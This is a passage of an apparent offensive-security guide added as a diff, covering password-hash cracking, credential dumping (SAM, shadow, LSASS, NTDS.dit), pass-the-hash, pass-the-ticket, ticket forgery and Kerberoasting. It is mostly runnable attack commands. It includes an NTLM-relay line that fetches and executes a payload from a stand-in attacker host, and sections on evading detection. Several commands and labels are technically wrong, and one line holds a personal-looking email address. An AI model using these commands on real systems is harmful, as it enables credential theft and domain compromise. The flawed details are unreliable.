+hashcat -a 0 -m 0 hashes.txt rockyou.txt
+# -a 0: dictionary attack
+# -m 0: MD5 hash type
+
+# Hybrid attack (dictionary + rules)
+hashcat -a 6 -m 0 hashes.txt dictionary.txt "?d?d?d?d"
+# Appends 4 digits to each dictionary word
+
+# Brute force (for short passwords)
+hashcat -a 3 -m 0 hashes.txt "?l?l?l?l?l?l?l?l"
+# Lowercase letters, 8 characters
+
+# GPU acceleration
+hashcat -a 0 -m 0 hashes.txt rockyou.txt --workload-profile=4 -O
+```
+
+**SHA-1 Hash Cracking**
+
+```bash
+john --format=raw-sha1 --wordlist=rockyou.txt hashes.txt
+
+hashcat -a 0 -m 100 hashes.txt rockyou.txt
+# -m 100: SHA-1 hash type
+
+# Salted SHA-1 (format: username:salt:hash)
+hashcat -a 0 -m 120 hashes.txt rockyou.txt
+```
+
+**SHA-256 Hash Cracking**
+
+```bash
+john --format=raw-sha256 --wordlist=rockyou.txt hashes.txt
+
+hashcat -a 0 -m 1400 hashes.txt rockyou.txt
+# -m 1400: SHA-256 hash type
+
+# Salted SHA-256
+hashcat -a 0 -m 1410 hashes.txt rockyou.txt
+```
+
+**NTLM Hash Cracking (Windows)**
+
+Extract NTLM hashes from SAM database:
+
+```bash
+# From live Windows system (requires SYSTEM privilege)
+reg save HKLM\SAM C:\SAM
+reg save HKLM\SYSTEM C:\SYSTEM
+
+# Transfer files to attack system
+# Use tools like secretsdump.py to extract hashes
+python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
+
+# Output format: username:RID:LMHash:NTLMHash
+```
+
+Crack NTLM hashes:
+
+```bash
+# John the Ripper
+john --format=nt --wordlist=rockyou.txt hashes.txt
+
+# Hashcat
+hashcat -a 0 -m 1000 hashes.txt rockyou.txt
+# -m 1000: NTLM hash type
+
+# Separate LM and NTLM portions (if both available)
+hashcat -a 0 -m 3000 hashes.txt rockyou.txt
+# -m 3000: LM hash type (legacy)
+```
+
+Process domain credential format:
+
+```bash
+# Format: domain\username:ntlm_hash
+awk -F: '{print $3":"$4}' domainlogins.txt > ntlm_hashes.txt
+hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt
+```
+
+**Kerberos Hash Cracking (AS-REP)**
+
+Extract Kerberos hashes from captured TGT requests:
+
+```bash
+# Using GetUserSPNs.py against Active Directory
+python3 GetUserSPNs.py -request -dc-ip target_host domain.com/user > kerberos_hashes.txt
+
+# Using Impacket roast
+python3 -m impacket.GetUserSPNs -request -dc-ip target_host domain.com/user
+```
+
+Crack Kerberos hashes:
+
+```bash
+# Hashcat Kerberos TGS-REP (service ticket)
+hashcat -a 0 -m 13100 kerberos_hashes.txt rockyou.txt
+# -m 13100: Kerberos TGS-REP hash type
+
+# Hashcat Kerberos AS-REP (pre-authentication not required)
+hashcat -a 0 -m 18200 kerberos_hashes.txt rockyou.txt
+# -m 18200: Kerberos AS-REP hash type
+
+# John the Ripper Kerberos
+john --format=krb5tgs --wordlist=rockyou.txt kerberos_hashes.txt
+```
+
+**bcrypt Hash Cracking**
+
+[Inference] bcrypt uses adaptive hashing with configurable work factor. Cracking significantly slower than MD5/SHA.
+
+```bash
+john --format=bcrypt --wordlist=rockyou.txt hashes.txt
+
+hashcat -a 0 -m 3200 hashes.txt rockyou.txt
+# -m 3200: bcrypt hash type
+```
+
+Bcrypt cracking is computationally expensive; GPU acceleration is essential:
+
+```bash
+hashcat -a 0 -m 3200 hashes.txt rockyou.txt --workload-profile=4 -O
+
+# -O: kernel optimization
+
+# --workload-profile=4: maximum resource usage
+````
+
+**Hash Extraction from Various Sources**
+
+Extract hashes from system files:
+
+```bash
+# Linux /etc/shadow (requires root)
+sudo cat /etc/shadow | grep -v "^#" | cut -d: -f1,2 > user_hashes.txt
+
+# Windows SAM via Volume Shadow Copy
+wmic shadowcopy call create (call="%systemroot%")
+vssadmin list shadows
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam" C:\sam
+
+# Password hash extraction via DPAPI
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+
+# Active Directory NTDS.dit extraction
+python3 secretsdump.py -ntds ntds.dit -system system LOCAL
+
+# Web application hashes (database exports)
+# MySQL password table
+SELECT user, authentication_string FROM mysql.user;
+
+# WordPress password hashes
+SELECT user_login, user_pass FROM wp_users;
+````
+
+**Dictionary Attack with Rules**
+
+Apply transformation rules to dictionary words:
+
+```bash
+# John the Ripper with built-in rules
+john --wordlist=rockyou.txt --rules:best hashes.txt
+
+# Custom rule file
+cat > custom_rules.txt << 'EOF'
+# Capitalize first letter
+c
+# Append numbers 2024-2025
+$2 $0 $2 $4
+$2 $0 $2 $5
+# Append special characters
+$! $@
+EOF
+
+john --wordlist=rockyou.txt --rules=custom_rules hashes.txt
+
+# Hashcat rule engine
+# Apply common substitutions and appendages
+hashcat -a 0 -m 1000 hashes.txt rockyou.txt -r rules/best64.rule
+
+# Chained rules
+hashcat -a 0 -m 1000 hashes.txt rockyou.txt -r rules/best64.rule -r rules/leetspeak.rule
+```
+
+**Mask Attack (Pattern-Based Cracking)**
+
+Define password patterns for brute force within constraints:
+
+```bash
+# Hashcat mask syntax
+# ?l = lowercase letter
+# ?u = uppercase letter
+# ?d = digit
+# ?s = special character
+# ?a = all character classes
+
+# Common pattern: Word + 4 digits
+hashcat -a 3 -m 1000 hashes.txt dictionary.txt "?d?d?d?d"
+
+# Pattern: Capital letter + 7 lowercase + 2 digits
+hashcat -a 3 -m 1000 hashes.txt "?u?l?l?l?l?l?l?l?d?d"
+
+# Pattern: 8-character lowercase
+hashcat -a 3 -m 1000 hashes.txt "?l?l?l?l?l?l?l?l"
+
+# Incremental patterns
+hashcat -a 3 -m 1000 hashes.txt "?l?l?l?l" --increment --increment-min=4 --increment-max=8
+```
+
+**Distributed Hash Cracking**
+
+Distribute cracking across multiple systems:
+
+```bash
+# Using hashcat with multiple GPUs
+hashcat -a 0 -m 1000 hashes.txt rockyou.txt -d 1,2,3
+# -d 1,2,3: utilize GPUs 1, 2, and 3
+
+# Distributed using hashtopolis (hash cracking framework)
+# Setup hashtopolis server and agents across multiple machines
+# Distribute hash workload automatically
+
+# Manual distribution via file splitting
+split -l 1000 hashes.txt hashes_split_
+
+# Process each split on separate system
+for file in hashes_split_*; do
+    hashcat -a 0 -m 1000 "$file" rockyou.txt > "${file}_cracked.txt" &
+done
+wait
+
+# Aggregate results
+cat hashes_split_*_cracked.txt > all_cracked.txt
+```
+
+**Performance Optimization**
+
+Maximize hash cracking speed:
+
+```bash
+# GPU selection and optimization
+hashcat -I
+# Lists available devices
+
+hashcat -a 0 -m 1000 hashes.txt rockyou.txt -d 1 --workload-profile=4 -O
+# -O: kernel optimization (faster but reduced accuracy for some algorithms)
+# --workload-profile=4: maximum resource usage
+
+# Session resumption
+hashcat -a 0 -m 1000 hashes.txt rockyou.txt --session=session1 --restore
+# Save progress and resume later
+
+# Disable output during cracking
+hashcat -a 0 -m 1000 hashes.txt rockyou.txt -q
+# -q: quiet mode
+```
+
+**Hash Cracking Pipeline (Multiple Algorithms)**
+
+Process unknown hash formats sequentially:
+
+```bash
+#!/bin/bash
+HASHES="hashes.txt"
+WORDLIST="rockyou.txt"
+
+# MD5
+echo "[*] Attempting MD5..."
+hashcat -a 0 -m 0 "$HASHES" "$WORDLIST" -q --outfile=cracked_md5.txt
+
+# SHA-1
+echo "[*] Attempting SHA-1..."
+hashcat -a 0 -m 100 "$HASHES" "$WORDLIST" -q --outfile=cracked_sha1.txt
+
+# SHA-256
+echo "[*] Attempting SHA-256..."
+hashcat -a 0 -m 1400 "$HASHES" "$WORDLIST" -q --outfile=cracked_sha256.txt
+
+# NTLM
+echo "[*] Attempting NTLM..."
+hashcat -a 0 -m 1000 "$HASHES" "$WORDLIST" -q --outfile=cracked_ntlm.txt
+
+# bcrypt
+echo "[*] Attempting bcrypt..."
+hashcat -a 0 -m 3200 "$HASHES" "$WORDLIST" -q --outfile=cracked_bcrypt.txt
+
+# Aggregate successful cracks
+cat cracked_*.txt > all_cracked.txt
+```
+
+**Rainbow Table Attack (When Applicable)**
+
+[Unverified] Rainbow tables are precomputed hash-to-plaintext mappings. Practical utility depends on hash algorithm and salt usage.
+
+```bash
+# Search rainbow tables online (crackstation.net, rainbowtables.it)
+# Or generate custom tables for CTF scenarios
+
+# Using rainbowcrack
+rtgen md5 loweralpha 1 8 0 33554432 0
+
+# Using generated rainbow tables
+rcrack *.rt -h 5f4dcc3b5aa765d61d8327deb882cf99
+
+# Online lookup
+curl "https://crackstation.net/api/lookup?hash=5f4dcc3b5aa765d61d8327deb882cf99&timeout=5"
+```
+
+**Salted Hash Cracking**
+
+Salted hashes are significantly harder to crack due to unique salt per hash:
+
+```bash
+# Extract salt and hash separately
+# Format: username:salt:hash
+
+awk -F: '{print $3":"$2":"$1}' salted_hashes.txt > formatted_hashes.txt
+
+# John the Ripper with salt handling
+john --format=sha512crypt --wordlist=rockyou.txt formatted_hashes.txt
+
+# Hashcat salted hashes
+hashcat -a 0 -m 1710 formatted_hashes.txt rockyou.txt
+# -m 1710: SHA-512 salted
+
+# Custom salt handling
+#!/bin/bash
+while IFS=: read -r username salt hash; do
+    # For each password, compute hash with salt
+    for password in $(cat rockyou.txt); do
+        computed_hash=$(echo -n "$salt$password" | sha256sum | cut -d' ' -f1)
+        if [ "$computed_hash" = "$hash" ]; then
+            echo "[+] $username:$password"
+        fi
+    done
+done < salted_hashes.txt
+```
+
+**Online Hash Lookups**
+
+Leverage precomputed hash databases:
+
+```bash
+# CrackStation API
+curl "https://crackstation.net/api/lookup?hash=5f4dcc3b5aa765d61d8327deb882cf99&timeout=5"
+
+# MD5Online
+curl "https://www.md5online.com/api/md5?hash=5f4dcc3b5aa765d61d8327deb882cf99"
+
+# MD5Decrypt
+curl "https://md5decrypt.net/api/api.php?hash=5f4dcc3b5aa765d61d8327deb882cf99&hash_type=md5&email=deanna_abshire@gmail.com"
+
+# Batch lookup script
+#!/bin/bash
+HASHES="hashes.txt"
+
+while read -r hash; do
+    result=$(curl -s "https://crackstation.net/api/lookup?hash=$hash&timeout=5" | grep -oP '"plaintext":"\K[^"]*')
+    if [ -n "$result" ]; then
+        echo "$hash:$result" >> cracked_hashes.txt
+    fi
+done < "$HASHES"
+```
+
+**Hash Cracking Forensics and Reporting**
+
+Document cracking results:
+
+```bash
+# Format cracked hashes with metadata
+#!/bin/bash
+
+echo "Hash Cracking Report" > crack_report.txt
+echo "===================" >> crack_report.txt
+echo "" >> crack_report.txt
+
+while read -r hash plaintext; do
+    echo "Hash: $hash" >> crack_report.txt
+    echo "Plaintext: $plaintext" >> crack_report.txt
+    echo "Length: ${#plaintext}" >> crack_report.txt
+    
+    # Analyze password complexity
+    if [[ "$plaintext" =~ [0-9] ]] && [[ "$plaintext" =~ [A-Z] ]]; then
+        echo "Complexity: High" >> crack_report.txt
+    elif [[ "$plaintext" =~ [0-9] ]] || [[ "$plaintext" =~ [A-Z] ]]; then
+        echo "Complexity: Medium" >> crack_report.txt
+    else
+        echo "Complexity: Low" >> crack_report.txt
+    fi
+    echo "---" >> crack_report.txt
+done < cracked_hashes.txt
+```
+
+**GPU-Accelerated Cracking Setup**
+
+Optimize hash cracking environment:
+
+```bash
+# Install NVIDIA CUDA and drivers (for NVIDIA GPU)
+# For Kali Linux:
+sudo apt-get install nvidia-driver-XXX nvidia-cuda-toolkit
+
+# Verify GPU detection
+nvidia-smi
+hashcat -I
+
+# AMD GPU support (HIP)
+sudo apt-get install hip-rocm
+
+# Verify hashcat GPU support
+hashcat -I
+
+# Benchmark GPU performance
+hashcat -b -m 1000
+```
+
+---
+
+## Pass-the-Hash
+
+Pass-the-Hash (PtH) attacks enable lateral movement and privilege escalation by using captured NTLM hashes to authenticate to systems without needing plaintext passwords, exploiting NTLM authentication mechanisms that accept password hashes directly.
+
+**NTLM Hash Capture and Extraction**
+
+Extract NTLM hashes from compromised systems:
+
+```bash
+# From registry (requires admin/SYSTEM)
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+reg save HKLM\SECURITY security.hive
+
+# Using secretsdump from Impacket
+impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
+impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
+
+# From live system (requires admin)
+impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c local
+```
+
+Windows-specific hash extraction:
+
+```powershell
+# Mimikatz (requires admin/SYSTEM)
+mimikatz # lsadump::sam
+mimikatz # lsadump::lsa /patch
+mimikatz # sekurlsa::logonpasswords
+
+# Hashcat ntlm capture
+ntlm::list
+```
+
+NTLM hash format: `username:UID:LMHash:NTHash`
+
+Example:
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+```
+
+The LM hash portion (first 32 characters) is deprecated and often shows `aad3b435b51404eeaad3b435b51404ee` (empty hash). The NTLM hash (second 32 characters) is the exploitable component.
+
+**Hash Validation and Verification**
+
+Verify extracted hashes are valid format:
+
+```bash
+# Check hash format
+echo "username:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c" | awk -F: '{print length($4)}'
+# Output: 32 (valid NTLM hash)
+
+# Test hash against known plaintext
+hashcat -m 1000 hash.txt wordlist.txt --show
+```
+
+[Inference] NTLM hash validity depends on format (32-character hexadecimal string) and authentication mechanism support on target systems, though validation occurs during authentication attempt rather than hash inspection.
+
+**Pass-the-Hash with SMB**
+
+Authenticate to SMB shares using NTLM hashes:
+
+```bash
+# Using pth-winexe from Impacket
+pth-smbclient -U "DOMAIN/user%LMHash:NTHash" //<target>/sharename
+
+# Using crackmapexec
+crackmapexec smb <target> -u user -H "NTHash"
+crackmapexec smb <target> -u user -H "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
+
+# Manual smbclient with hash
+smbclient //<target>/share -U "DOMAIN/user" --pw-nt-hash <NTHash>
+```
+
+[Inference] SMB PtH exploitation works on systems with NTLM authentication enabled where the server accepts hashes directly rather than requiring plaintext password processing, though modern Windows versions default to NTLMv2 with enhanced security.
+
+**Pass-the-Hash with RDP**
+
+Authenticate to RDP services using NTLM hashes:
+
+```bash
+# Using xfreerdp
+xfreerdp /v:<target> /u:<user> /pth:<hash> /d:DOMAIN
+
+# Using freerdp with hash
+freerdp /v:<target> /u:user /pth:<hash>
+
+# Restricted Admin Mode (Windows 8.1+, Server 2012 R2+)
+xfreerdp /v:<target> /u:user /pth:<hash> /restricted-admin
+```
+
+[Unverified] Restricted Admin mode enables RDP PtH attacks on newer Windows versions by using cached credentials with restricted authentication context, though [Inference] exploitation requires Restricted Admin mode to be enabled and the authenticating user to have appropriate privileges.
+
+Alternative using `pth-rpcclient`:
+
+```bash
+pth-rpcclient -U "DOMAIN/user%LMHash:NTHash" <target>
+```
+
+**Pass-the-Hash with WinRM**
+
+Execute commands via WinRM using NTLM hashes:
+
+```bash
+# Using evil-winrm
+evil-winrm -i <target> -u user -H <NTHash> -d DOMAIN
+
+# Using crackmapexec
+crackmapexec winrm <target> -u user -H <NTHash>
+
+# Using impacket-wmiexec
+impacket-wmiexec -hashes :<NTHash> DOMAIN/user@<target>
+```
+
+WinRM PtH requires [Inference] the target system to have WinRM service enabled (typically on server systems and workstations in enterprise domains) and the authenticating user to have appropriate privileges for command execution.
+
+**Pass-the-Hash with LDAP**
+
+Query LDAP services using NTLM authentication:
+
+```bash
+# Using ldapclient with hash
+ldapsearch -H ldap://<target> -U "DOMAIN\user" -W <NTHash> -b "dc=domain,dc=local"
+
+# Using impacket-ldapdomaindump
+impacket-ldapdomaindump -u "DOMAIN/user" -p ":<NTHash>" --no-pass <target>
+
+# Using crackmapexec for LDAP
+crackmapexec ldap <target> -u user -H <NTHash>
+```
+
+LDAP PtH enables [Inference] domain reconnaissance and information gathering through LDAP queries using compromised hashes, allowing enumeration of users, groups, and organizational structure regardless of plaintext password knowledge.
+
+**Pass-the-Hash with Kerberos (Silver Ticket)**
+
+Create Silver Tickets using extracted machine account hashes:
+
+```bash
+# Extract machine account hash (NTLM)
+# From SAM registry or domain controller
+
+# Create Silver Ticket (krbtgt hash)
+mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<NTHash> /ticket:ticket.kirbi
+
+# Alternatively, using impacket
+impacket-ticketer -nthash <NTHash> -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain DOMAIN.LOCAL -user Administrator ticket.ccache
+```
+
+[Inference] Silver Ticket exploitation uses machine account hashes to forge service tickets for specific services, enabling [Inference] access to those services under the forged identity, though exploitation requires knowledge of machine account hashes and valid domain SID.
+
+**Pass-the-Hash Detection and Evasion**
+
+Identify PtH usage through logging:
+
+```
+Event ID 4624 (Account Logon) with suspicious NTLMv2 indicators
+Event ID 4769 (Kerberos Ticket Granted) showing unusual patterns
+Logon Type 3 (Network) with unusual accounts
+```
+
+Evade detection through:
+
+```bash
+# Use legitimate service accounts with extracted hashes
+# Conduct PtH during normal business hours
+# Use commonly accessed systems as intermediate targets
+# Distribute hash usage across multiple source systems
+
+# Timing attacks to blend with legitimate activity
+crackmapexec smb <target-range> -u user -H <NTHash> --continue-on-success
+```
+
+[Inference] PtH evasion exploits detection blind spots where NTLM authentication logs show account logon but [Inference] detection systems struggle to distinguish legitimate authentication from compromised hash usage without behavioral analysis, though modern EDR solutions implement hash-based detection signatures.
+
+**Constrained Delegation with Pass-the-Hash**
+
+Exploit constrained delegation using compromised service account hashes:
+
+```bash
+# Extract service account hash
+# Use S4U2Proxy to obtain tickets for delegated services
+
+impacket-getST -hashes :<NTHash> -impersonate Administrator -spn cifs/target DOMAIN/serviceaccount@DOMAIN.LOCAL
+```
+
+[Inference] Constrained delegation PtH exploitation enables impersonation of arbitrary users for services configured in delegation list, allowing lateral movement to administratively-sensitive systems when combined with S4U2Proxy protocol support.
+
+**Pass-the-Hash via Responder and NTLM Relay**
+
+Capture and relay NTLM hashes through man-in-the-middle:
+
+```bash
+# Start Responder to capture hashes
+responder -I eth0 -r -w
+
+# NTLM relay to SMB
+impacket-ntlmrelayx -t smb://<target> -c "powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://attacker/payload.ps1\")'"
+
+# NTLM relay to LDAP
+impacket-ntlmrelayx -t ldap://<target-dc> --escalate-user targetuser
+```
+
+[Unverified] NTLM relay attacks capture authentication traffic through network positioning (MITM) and relay credentials to target services, enabling [Inference] exploitation of systems configured to trust relay sources or systems where SMB Signing is not enforced.
+
+**Hash Cracking for Plaintext Recovery**
+
+Crack extracted NTLM hashes to obtain plaintext passwords:
+
+```bash
+# Using hashcat
+hashcat -m 1000 hashes.txt wordlist.txt
+hashcat -m 1000 hashes.txt wordlist.txt --show
+
+# Using john
+john --format=NT hashes.txt
+john --format=NT hashes.txt --show
+
+# Using rainbow tables
+rtgen ntlm loweralpha 1 8 0 100000 0 /path/to/tables
+rcrack /path/to/tables/*.rt hashes.txt
+```
+
+NTLM hash cracking enables [Inference] plaintext password recovery for offline attacks or situations where pass-the-hash is not applicable, though cracking success depends on password strength and computational resources.
+
+**Pass-the-Hash Across Trusts**
+
+Exploit trust relationships for cross-domain PtH:
+
+```bash
+# Identify domain trusts
+nltest /domain_trusts
+
+# Use PtH across trusts
+crackmapexec smb <trusted-domain-target> -u "DOMAIN/user" -H <NTHash> --continue-on-success
+
+# Create inter-realm tickets using forged credentials
+impacket-ticketer -nthash <NTHash> -domain-sid <TRUSTED-SID> -domain TRUSTED.LOCAL -user Administrator ticket.ccache
+```
+
+[Inference] Cross-domain PtH exploitation enables lateral movement between forest domains when trust relationships exist and compromised accounts have cross-domain permissions, though [Unverified] trust exploitation depends on specific trust type (external, transitive, bidirectional) and authentication policies.
+
+---
+
+## Pass-the-Ticket
+
+Pass-the-Ticket (PtT) attacks enable lateral movement and privilege escalation by using stolen Kerberos tickets to authenticate to systems without needing NTLM hashes or plaintext passwords, exploiting Kerberos ticket caching and reuse mechanisms.
+
+**Kerberos Ticket Extraction**
+
+Extract cached Kerberos tickets from compromised systems:
+
+```bash
+# List cached tickets
+klist
+klist -c /tmp/ccache_file
+
+# Extract tickets using Mimikatz (requires admin/SYSTEM)
+mimikatz # kerberos::list
+mimikatz # kerberos::list /export
+
+# Export tickets via klist
+klist -c /tmp/ccache_file -e
+```
+
+Ticket locations by system:
+
+- **Linux/Unix**: `/tmp/krb5cc_[UID]` (Kerberos credential cache)
+- **macOS**: `/var/tmp/krb5cc_[UID]`
+- **Windows**: LSASS process memory (extracted via Mimikatz)
+
+Ticket format inspection:
+
+```bash
+# Examine exported ticket structure
+file ticket.kirbi
+hexdump -C ticket.kirbi | head -20
+```
+
+[Inference] Kerberos tickets contain encryption material and user identity information usable for authentication regardless of original ticket acquisition method, enabling reuse on any system with network access to Kerberos services.
+
+**Ticket Injection and Reuse**
+
+Import extracted tickets for local authentication:
+
+```bash
+# Import cached ticket (Linux/Unix)
+export KRB5CCNAME=/tmp/ccache_file
+kinit -c /tmp/ccache_file --keytab=ticket.ccache
+
+# Alternative import method
+kinit -c /tmp/ccache_file -C ticket.ccache user@DOMAIN.LOCAL
+
+# Verify ticket import
+klist -c /tmp/ccache_file
+```
+
+Windows ticket injection:
+
+```powershell
+# Mimikatz ticket injection
+mimikatz # kerberos::ptt ticket.kirbi
+
+# Verify injected tickets
+klist
+```
+
+[Inference] Injected tickets function identically to legitimately obtained tickets, enabling authentication to services configured to accept Kerberos tickets from the injected identity, though [Unverified] ticket validity depends on ticket expiration and server clock synchronization.
+
+**TGT Theft and Abuse**
+
+Ticket-Granting Tickets (TGTs) enable acquisition of additional service tickets without contacting the KDC:
+
+```bash
+# Extract TGT using Mimikatz
+mimikatz # sekurlsa::tickets /export
+
+# Locate exported TGTs
+ls -la *.kirbi | grep krbtgt
+
+# Inject TGT for lateral movement
+mimikatz # kerberos::ptt [0;12a60]-0-0-40a10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi
+```
+
+TGT reuse enables [Inference] acquiring new service tickets for any service within the domain without password or hash knowledge, though [Unverified] TGT validity depends on specific Kerberos implementation regarding ticket reuse restrictions.
+
+**Silver Ticket Creation (Service Account Hash)**
+
+Forge service-specific tickets using machine account hashes:
+
+```bash
+# Extract service account hash (NTLM)
+# Service hashes available from NTDS.DIT or SAM
+
+# Create Silver Ticket for CIFS service
+mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:SERVER.DOMAIN.LOCAL /service:cifs /rc4:<ServiceHash> /ticket:silver.kirbi
+
+# Alternative using impacket
+impacket-ticketer -nthash <ServiceHash> -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain DOMAIN.LOCAL -user Administrator -spn cifs/SERVER.DOMAIN.LOCAL silver.ccache
+```
+
+Silver Ticket services (common SPNs):
+
+```
+cifs/server.domain.local  (SMB file shares)
+ldap/dc.domain.local  (LDAP directory)
+krbtgt/domain.local  (KDC services)
+http/server.domain.local  (HTTP services)
+mssql/server.domain.local  (SQL Server)
+wsman/server.domain.local  (WinRM)
+```
+
+[Inference] Silver Tickets enable access to specific services under forged identities, restricted to the service specified in the ticket, though forged tickets bypass standard authentication checks when accepted by service principals.
+
+**Golden Ticket Creation (Krbtgt Hash)**
+
+Forge domain-wide tickets using Krbtgt hash (covered in detail in Golden Ticket Attacks section):
+
+```bash
+# Extract Krbtgt hash from domain controller
+impacket-secretsdump -dc-ip <DC-IP> DOMAIN/user:password@<DC>
+
+# Create Golden Ticket
+mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:golden.kirbi
+
+# Inject and reuse Golden Ticket
+mimikatz # kerberos::ptt golden.kirbi
+klist
+```
+
+Golden Tickets enable [Inference] access to any domain resource under any forged identity, providing persistent domain access regardless of password changes, though [Unverified] ticket validity depends on Krbtgt hash remaining unchanged or authentication policies implementing ticket validation.
+
+**Pass-the-Ticket with Service Impersonation**
+
+Use PtT to impersonate high-privilege accounts:
+
+```bash
+# Extract admin TGT
+mimikatz # sekurlsa::tickets /export
+
+# Inject admin TGT
+mimikatz # kerberos::ptt [0;12a60]-2-0-40a10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi
+
+# Access resources as admin
+klist
+crackmapexec smb <target> -u Administrator --use-kcache
+```
+
+[Inference] TGT impersonation enables lateral movement to systems and services where the forged identity has permissions, though exploitation impact depends on forged account's domain privilege level and service configurations.
+
+**Pass-the-Ticket with S4U2Self and S4U2Proxy**
+
+Exploit service delegation using forged tickets (detailed in Kerberoasting section):
+
+```bash
+# Create forged service ticket via S4U2Self
+impacket-getST -impersonate Administrator -spn cifs/SERVER DOMAIN/serviceaccount:password@<DC>
+
+# Alternative with hash
+impacket-getST -hashes :<Hash> -impersonate Administrator -spn cifs/SERVER DOMAIN/serviceaccount@<DC>
+
+# Inject and use delegated ticket
+export KRB5CCNAME=./Administrator.ccache
+klist
+```
+
+[Inference] S4U2Self/S4U2Proxy exploitation enables impersonation of arbitrary users when service accounts have delegation configured, allowing privilege escalation to domain administrator levels through forged tickets.
+
+**Ticket Lifetime and Renewal**
+
+Analyze and extend ticket validity:
+
+```bash
+# Check ticket lifetime
+klist -c /tmp/ccache_file
+
+# TGT renewal (valid for full lifetime + renewability period)
+kinit -R -c /tmp/ccache_file
+
+# Create long-lifetime forged tickets
+mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<Hash> /ticket:golden.kirbi /startoffset:0 /endin:35791394 /renewmax:35791394
+```
+
+[Inference] Extended ticket lifetimes in forged tickets enable longer persistence compared to legitimate tickets, though [Unverified] ticket validity windows depend on domain Kerberos policy settings and domain controller clock synchronization.
+
+**Pass-the-Ticket Detection and Evasion**
+
+Identify PtT usage through logging:
+
+```
+Event ID 4768 (Kerberos Authentication Ticket Requested)
+Event ID 4769 (Kerberos Service Ticket Requested)
+Event ID 4770 (Kerberos Service Ticket Renewed)
+Event ID 4771 (Kerberos Pre-Authentication Failed)
+```
+
+Evade detection through:
+
+```bash
+# Use legitimate service accounts' tickets
+# Inject tickets during normal logon hours
+# Space out ticket usage across multiple services
+# Use encryption algorithms common in environment
+
+# Timing attacks
+crackmapexec smb <target-range> -u Administrator --use-kcache --continue-on-success
+```
+
+[Inference] PtT evasion exploits event log analysis limitations where Kerberos events show ticket usage but detection relies on behavioral analysis to distinguish legitimate ticket reuse from compromised ticket exploitation, though modern EDR solutions implement machine learning-based anomaly detection.
+
+**Cross-Realm Pass-the-Ticket**
+
+Exploit inter-realm trust relationships for cross-forest movement:
+
+```bash
+# Extract inter-realm TGT from domain trust
+# Trust relationships enable cross-realm Kerberos authentication
+
+# Create inter-realm ticket
+impacket-ticketer -nthash <TrustHash> -domain-sid <TRUSTED-DOMAIN-SID> -domain TRUSTED.LOCAL -user Administrator -spn krbtgt/TRUSTED.LOCAL inter-realm.ccache
+
+# Use inter-realm ticket
+export KRB5CCNAME=./inter-realm.ccache
+klist
+```
+
+[Unverified] Cross-realm PtT exploitation enables lateral movement between forest domains when inter-realm trust relationships exist and tickets are accepted by trusting domain, though [Inference] exploitation depends on specific trust type and Kerberos trust configuration.
+
+---
+
+## Kerberoasting
+
+Kerberoasting attacks extract service ticket hashes through legitimate Kerberos authentication, enabling offline password cracking against service accounts without requiring administrative access.
+
+**Service Principal Name (SPN) Enumeration**
+
+Identify service accounts suitable for Kerberoasting:
+
+```bash
+# Query Kerberos for SPNs
+setspn -T DOMAIN.LOCAL -F -Q */*
+
+# Using GetUserSPNs.py (Impacket)
+impacket-GetUserSPNs DOMAIN.LOCAL/user:password
+
+# Query specific domain controller
+impacket-GetUserSPNs -dc-ip <DC-IP> DOMAIN.LOCAL/user:password
+
+# LDAP-based SPN enumeration
+ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "servicePrincipalName=*" sAMAccountName
+```
+
+SPN format analysis:
+
+```
+service_class/hostname:port/service_name
+cifs/server.domain.local
+http/webapp.domain.local:8080
+mssql/database.domain.local
+```
+
+[Inference] SPNs identify service accounts running under non-machine identities, enabling targeted Kerberoasting attacks against accounts where password cracking is feasible compared to machine account passwords.
+
+**Kerberos TGS Ticket Extraction**
+
+Request service tickets for cracking:
+
+```bash
+# Using GetUserSPNs.py with -request flag
+impacket-GetUserSPNs DOMAIN.LOCAL/user:password -request
+
+# Export tickets in format suitable for cracking
+impacket-GetUserSPNs -dc-ip <DC-IP> DOMAIN.LOCAL/user:password -request -outputfile hashes.txt
+
+# Alternative: manual klist export (Windows)
+setspn -T DOMAIN.LOCAL -F -Q */* > spns.txt
+```
+
+[Inference] TGS ticket extraction leverages legitimate user credentials to request service tickets for any SPN in the domain, generating crackable tickets suitable for offline password attacks against service accounts.
+
+**Ticket Format and Extraction**
+
+Analyze extracted TGS tickets:
+
+```bash
+# Tickets exported in Hashcat format
+cat hashes.txt
+# Output format: $krb5tgs$23$*$DOMAIN.LOCAL$SERVICE/SERVER$*$[encrypted_hash]
+
+# Alternative output formats
+# John the Ripper: $krb5tgs$[format_indicator]$[encrypted_material]
+# Tshark pcap analysis: extract tickets from Kerberos traffic
+```
+
+Verify ticket format:
+
+```bash
+# Check ticket count
+wc -l hashes.txt
+
+# Validate ticket format
+head -1 hashes.txt
+```
+
+[Unverified] Extracted TGS tickets contain encryption material derived from service account passwords, enabling [Inference] offline brute-force attacks through comparison of decryption results against known plaintext Kerberos structures.
+
